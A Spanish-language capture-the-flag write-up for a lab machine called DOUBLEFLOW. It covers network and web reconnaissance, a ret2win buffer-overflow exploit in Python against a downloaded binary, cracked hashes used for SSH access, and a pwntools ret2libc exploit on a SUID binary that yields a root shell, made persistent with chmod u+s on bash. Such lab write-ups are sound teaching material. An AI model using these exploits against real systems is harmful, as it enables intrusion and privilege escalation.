# DOUBLEFLOW

## RECONOCIMIENTO DE RED

### conectividad y SO

Comprobamos la conectividad con la máquina: `ping -c 1 172.17.0.2`.
> `-c 1`: solo enviar 1 paquete ICMP

![image](https://github.com/user-attachments/assets/ba0c8cff-0fd1-4888-927b-dfa2a683c2d7)

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos con nmap: `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports`.
> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

#### puertos abiertos

**22 - TCP - SSH**

**80 - TCP - HTTP**

**39817 - TCP - UNKNOWN**


Hacemos un escaneo de servicios y versiones con nmap sobre los puertos abiertos: `nmap -p22,80,39817 -sCV 172.17.0.2 -oN tcp_ports_targeted`.
> `-p22,8039817` hacer el escaneo sobre el puerto 22, 80 y el 39817.

> `-sCV` escanear el servicio y la versión (`sV`) y lanzar los scripts de reconocimiento por defecto (`sC`)

> `-oN tcp_ports_targeted` exportar el output en formato nmap al archivo `tcp_ports_targeted`

## RECONOCIMIENTO WEB

Primero lanzamos desde consola el comando `whatweb http://172.17.0.2` :

![image](https://github.com/user-attachments/assets/df729ea2-dca6-4fc2-8928-c46197ce6764)

Vemos la versión del apache 2.4.61 que ahora mismo no tiene ninguna vulnerabilidad descubierta.
Pasamos a ver la web desde el navegador.
Vemos que en la raíz esta esto:

![image](https://github.com/user-attachments/assets/cc13b0d4-99fe-4fc0-8e4f-24b26119c177)

Como no es ninguna información útil, hacemos fuzzing: `gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,py,html`. Encontramos un archivo interesante llamado app1. Si probamos esa ruta, vemos que se nos descarga un archivo app1.

## BUFFER OVERFLOW 

Si hacemos el comando `file ./app1` vemos que es un binario ejecutable. Si lo ejecutamos vemos esto:

![image](https://github.com/user-attachments/assets/b649c9c8-5701-4782-ba33-62ae1792da85)

Parece ser que el binario ha montado un socket en nuestro equipo por el puerto 17562. Si nos conectamos con telnet vemos esto:

![image](https://github.com/user-attachments/assets/32cbe185-58f9-4086-83b2-e9f817abcf14)

Nos pide un input. Si ponemos cualquier cosa el socket socket se cierra simplemente. Podemos probar a enviar muchos bytes como input para ver si ocurre un buffer overflow. Por ejemplo, generamos 500 bytes:
`pattern.py -m generate -v 500` (herramienta https://github.com/4bytess/pattern_generator) Y los ponemos como input:

![image](https://github.com/user-attachments/assets/d7d5917a-668e-4328-a7ea-a5254131d86e)

Al hacer esto, vemos como en la ventana del socket pone:

![image](https://github.com/user-attachments/assets/127af5b8-2356-4ebc-816f-ed3c2102101a)

Ha ocurrido un buffer overflow. Podemos usar `checksec ./app1` para ver que medidas de seguridad tiene el binario, para ver en que podemos derivar este buffer overflow:

![image](https://github.com/user-attachments/assets/0d84a528-f4d6-406b-b42b-b4d9e824d6f6)

Vemos que solo tiene NX. No tiene canarios ni PIE, es decir que podemos sobrescribir el stack pero no ejecutar shellcode en el stack. Además las direcciones del código del binario son estáticas, por lo que se puede hacer un buffer overflow de tipo ret2win, en donde sobrescribimos el EIP con la dirección de una función que existe en el binario que nunca se llama de por sí. Podemos ver todas las funciones definidas en el binario usando GDB. Hacemos `gdb ./app1` y dentor de GDB ejecutamos `info functions`:

![image](https://github.com/user-attachments/assets/50d3724e-279c-4504-83b2-c66131279f11)

Vemos una función llamada secret_function. Podríamos intentar llamar a esta función con el buffer overflow.
Antes de nada hay que saber el offset en el cual sobrescribimos el registro EIP. Para eso generamos otra vez un patrón de 500 bytes: `pattern.py -m generate -v 500`. Y ejecutamos otra vez el binario app1 pero esta vez con GDB: `gdb app1` esto lo hacemos para que cuando ocurra el buffer overflow podamos ver el valor de la dirección de retorno. Y mientras el binario escucha por 0.0.0.0:17562, enviamos los 500 bytes. Y cuando ocurre el buffer overflow podemos ver esto:

![image](https://github.com/user-attachments/assets/fc0326a2-9841-4b76-908f-91b73de4c440)

La dirección de retorno vale 0x3262363262353262. Para pasar esto a ASCII hacemos `unhex "3262363262353262" | rev`, unhex para pasarlo de hexadecimal a ASCII y rev porque los bytes estaban ordenados en formato LSB. Y se nos queda la cadena "b25b26b2". Ahora para calcular el offset hacemos `pattern.py -m offset -v b25b26b2` y sale que el offset es 312. Ahora ya sabemos que cuando enviemos 312 bytes al socket, los siguientes 8 bytes son los que van a sobrescribir el EIP. Y lo que vamos a meter en el EIP es la dirección de la función secret_function, así que volvemos a hacer  `gdb app1`, `info functions` y copiamos la dirección que aparezca a la izquierda de secret_function.

Ahora ya tenemos todo lo necesario para el ataque, solo queda hacer el exploit en python:

```
#!/usr/bin/python3

from pwn import p64
import socket

payload = b'A' * 312 + p64(0x00000000004011b6)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("127.0.0.1", 17562))

sock.recv(1024)

sock.send(payload + b'\r\n')

sock.close()
```

Creamos el payload, que serían los 312 bytes de relleno más la dirección de la función secret_funtion (siempre es la misma porque el binario no usa PIE). Creamos un socket que use IPv4 y TCP. Lo conectamos al socket del binario. Recibimos 1024 bytes, correspondientes al texto "Escribe algo:" que nos envía el binario. Enviamos el payload y cerramos el socket.

Si ejecutamos el binario y luego este exploit veremos que conseguimos llamar a la función secret_function. Y además el binario escribe esto:

![image](https://github.com/user-attachments/assets/7738bd2f-d5a7-45e5-b413-f57112ceceb1)

Nos da un hash SHA256. Si lo metemos en crackstation.net vemos que equivale al texto tiggerjake.

## INTRUSIÓN

Si nos acordamos la máquian tenía el puerto 39817 abierto. Como no sabemos que es, podemos probar a conectarnos con telnet o netcat. Si nos conectamos vemos que nos pide una contraseña. Si probamos a poner tiggerjake, vemos que nos pone esto:

![image](https://github.com/user-attachments/assets/ae62569e-2634-444c-9627-467af47e40b9)

Nos da otro hash SHA256 que corresponde a la contraseña del usuario pepe. Si ponemos en crackstation.net el hash nos sale que es el texto plasticfloor17. Entonces probamos a conectarnos por ssh: `ssh pepe@172.17.0.2` y como contraseña plasticfloor17. Y vemos que nos deja

## ESCALADA DE PRIVILEGIOS (BUFFER OVERFLOW)

Siendo el usuario pepe, si vamos a /home/pepe, hay dos binarios: app2 y app3. El primero es el que veíamos desde fuera de la máquina que escuchaba por el puerto 39817. El segundo es otro binario. Si hacemos `ls -l` vemos que app3 tiene permisos SUID y su propietario es root, por lo que si conseguimos que el binario ejecute una consola ganaríamos un shell como root. Si ejecutamos el binario app3 vemos esto:

![image](https://github.com/user-attachments/assets/0b842d80-b2ef-4f6f-8707-5882acb8d089)

Nos pide un input. Si enviamos 500 bytes por ejemplo, vemos que da un error porque ha habido un buffer overflow. Si nos traemos el binario a nuestra máquina montando un servidor simple por HTTP con python (`python3 -m http.server 8080`) y ejecutamos `checksec ./app3` vemos esto:

![image](https://github.com/user-attachments/assets/fb0416e7-2c43-4ee3-9ff7-6a1294e6290c)

Al igual que binario app1, solo tiene como protección NX, es decir que no podemos ejecutar shellcodes. Si listamos las funciones que tiene definidas el binario, solo está la función main, por lo que no se podría hacer un ret2win ya que no hay funciones interesantes a las que saltar. Pero si nos fijamos, si ejecutamos `ldd ./app3` en la máquina víctima, veremos que la dirección base de libc.so.6 es siempre la misma, por lo que no hay ASLR. Esto nos hace mucho más fácil hacer un ataque ret2libc. Este ataque consiste en hacer un buffer overflow y llamar a la función system() y como parámetro "/bin/sh". Se sabe que dentro del código del binario libc, está creada la función system() y también existe la cadena de texeto "/bin/sh", entonces tenemos que localizar sus direcciones y usarlas en nuestro buffer overflow.

Tanto system() como "/bin/sh" tienen un offset desde la dirección base de libc. Tenemos que conseguir ese offset para sumárselo a la dirección de libc para conseguir la dirección exacta de system() y "/bin/sh".
Para ver el offset de system() ejecutamos `readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"` (esto list todos los símbolos de libc y filtra por system):

![image](https://github.com/user-attachments/assets/300c01e9-bb1e-49cb-a3d3-bb701be00c89)

Vemos que el offset es 0x000000000004c490. Sabemos que libc está en /lib/x86_64-linux-gnu/libc.so.6 gracias al comando `ldd` que lista a que objetos está enlazado dinámicamente el binario

Para sacar el offset de la cadena "/bin/sh" ejecutamos `strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"` (esto lista todas las cadenas de texto definidas en libc y filtra por "/bin/sh"):

![image](https://github.com/user-attachments/assets/2fbb577d-68c4-456b-861f-2e7499d36284)

Vemos que el offset es 0x196031.

Ahora ya tenemos los offsets de system() y "/bin/sh". Pero si queremos pasar "/bin/sh" como parámetro a system() en el buffer overflow, tenemos que meter en el registro RDI un puntero a la cadena "/bin/sh" (que sería la dirección de libc más el offset de "/bin/sh"), y para meter ese valor en RDI necesitamos encontrar dentro del binario app3 una instrucción pop rdi, para meter un valor del stack en el RDI. Para buscarlo hacemos `ropper --file ./app3 --search "pop rdi"`:

![image](https://github.com/user-attachments/assets/927e1890-8d9e-4b1c-8df8-3591a59bec98)

Vemos que en la dirección 0x000000000040116a están las instrucciones pop rdi; nop; pop rbp; ret; 

Solo queda saber una cosa, el offset en el que sobrescribimos el EIP. Generamos un patrón de 500 bytes y ejecutamos con GDB el binario app3: `gdb app3`, y lo ejecutamos `run`. Y cuando nos pida el input ponemos el patrón y veremos esto:

![image](https://github.com/user-attachments/assets/5c191195-dfd7-43fe-8417-e9245e2484e5)

La dirección de retorno vale 0x3235613135613035. Para pasarlo a texto hacemos `unhex 3235613135613035 | rev`. Sale que es 50a51a52. Entonces hacemos `pattern.py -m offset -v 50a51a52` y nos dice que el offset es 136.

Ahora ya tenemos todo lo necesario para hacer el exploit que nos de una shell como root:

```
#!/usr/bin/python3

from pwn import *

libc_base_addr = 0x00007ffff7ddd000 # ldd app3

system_offset = 0x000000000004c490 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
system_addr = libc_base_addr + system_offset

binsh_offset = 0x196031 # strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
binsh_addr = libc_base_addr + binsh_offset

pop_rdi_addr = 0x000000000040116a # ropper --file app3 --search "pop rdi"

payload = b'A' * 136 + p64(pop_rdi_addr) + p64(binsh_addr) + b'R' * 8 + p64(system_addr)

proc = process("./app3")

proc.sendlineafter(b's:', payload)

proc.interactive()
```

Calculamos las direcciones de la funcións system() y la cadena "/bin/sh". Creamos el payload que sean 136 bytes de relleno más la dirección que apunta a pop rdi; nop; pop rbp; ret;, que meterá en el RDI el primer valor del stack que es la dirección de binsh ya que hemos sobrescrito el stack a partir de los 136 bytes. Luego 8 bytes de relleno ya que recordemos que la dirección a pop_rdi, tiene luego la instrucción pop_rbp, por lo que va a meter nuestro siguiente valor en el registro RBP, y como no nos interesa que meta la dirección a system() en el RBP, metemos 8 bytes de relleno que serán los que se metán en el RBP. Y finalmente la dirección de system(), que cuando se salte a esta dirección como el RDI será un puntero a "/bin/sh", se nos ejecutará una /bin/sh  como root.

Luego creamos un proceso que sea app3. Cuando recibamos el texto s: (del texto "de aqui no pasas:" que escribe el binario), enviamos el payload. Luego ponemos el modo interactivo para cuando nos llegue la shell.

Y ahora ejecutamos el exploit en la máquina víctima en el directorio /home/pepe:

![image](https://github.com/user-attachments/assets/66c8dd29-5602-4de3-a3bb-224654b15114)

Y ya tenemos una shell en python interactive como root. Si queremos pasarnos a una bash que es más cómoda, hacemos desde la consola de python `chmod u+s /bin/bash`, salimso de la shell de python y ejecutamos `bash -p` para tener una bash como root:

![image](https://github.com/user-attachments/assets/04bcefdd-b591-4b36-bdd1-9556e5893877)

Y ya está todo pwneado.